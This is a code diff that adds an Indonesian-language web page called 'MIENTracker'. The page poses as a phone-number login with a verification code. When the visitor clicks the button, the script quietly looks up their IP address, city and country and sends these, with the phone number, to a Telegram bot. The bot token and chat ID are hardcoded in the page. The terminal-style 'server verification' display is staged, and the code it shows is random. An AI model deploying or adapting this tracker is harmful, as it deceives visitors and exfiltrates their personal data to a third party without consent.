@@ -1,0 +1,84 @@
+
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>MIENTracker - No Password</title>
+  <style>
+    body { background: black; color: lime; font-family: monospace; margin: 0; padding: 20px; }
+    input, button { padding: 10px; font-size: 16px; border: none; margin: 5px 0; }
+    .terminal { background: #111; border: 1px solid lime; padding: 10px; margin-top: 20px; height: 200px; overflow-y: auto; }
+    .hidden { display: none; }
+  </style>
+</head>
+<body>
+  <h2>📡 MIENTracker</h2>
+  <label>Nomor Telepon:</label><br>
+  <input type="text" id="loginPhone" placeholder="+628xxxx"><br>
+  <button onclick="triggerLogin()" id="loginButton">Klik untuk dapatkan kode</button>
+
+  <div class="terminal hidden" id="terminal"></div>
+
+  <script>
+    let verificationCode = "";
+    let loggedInPhoneNumber = "";
+
+    function addTerminalLine(text) {
+      const term = document.getElementById('terminal');
+      term.innerHTML += text + "<br>";
+      term.scrollTop = term.scrollHeight;
+    }
+
+    function generateRandomCode() {
+      return Math.floor(100000 + Math.random() * 900000).toString();
+    }
+
+    function sendToTelegram(message) {
+      const chatId = "7932600874";
+      const token = "7723202416:AAHGcGq9XYJbXd3fgJHHl64CJ-Ovau2KI44";
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text: message })
+      });
+    }
+
+    function triggerLogin() {
+      const phone = document.getElementById('loginPhone').value;
+      if (!phone) {
+        alert("Masukkan nomor terlebih dahulu.");
+        return;
+      }
+      loggedInPhoneNumber = phone;
+      document.getElementById("loginButton").disabled = true;
+      document.getElementById("terminal").classList.remove("hidden");
+
+      fetch("https://ipapi.co/json")
+        .then(res => res.json())
+        .then(data => {
+          const ip = data.ip + " (" + data.city + ", " + data.country_name + ")";
+          sendToTelegram(`🔐 LOGIN ATTEMPT\n📱 Nomor: ${phone}\n🌐 IP: ${ip}`);
+          startVerification();
+        })
+        .catch(() => {
+          sendToTelegram(`🔐 LOGIN ATTEMPT\n📱 Nomor: ${phone}\n🌐 IP: Unavailable`);
+          startVerification();
+        });
+    }
+
+    function startVerification() {
+      addTerminalLine("> Menghubungkan ke server verifikasi...");
+      setTimeout(() => {
+        addTerminalLine("> Server merespons... [200 OK]");
+        setTimeout(() => {
+          verificationCode = generateRandomCode();
+          addTerminalLine("> Kode anda adalah:");
+          addTerminalLine("   " + verificationCode);
+          sendToTelegram(`📳 VERIFICATION CODE SENT\n📱 Nomor: ${loggedInPhoneNumber}\n🔢 Kode: ${verificationCode}`);
+        }, 1000);
+      }, 1500);
+    }
+  </script>
+</body>
+</html>
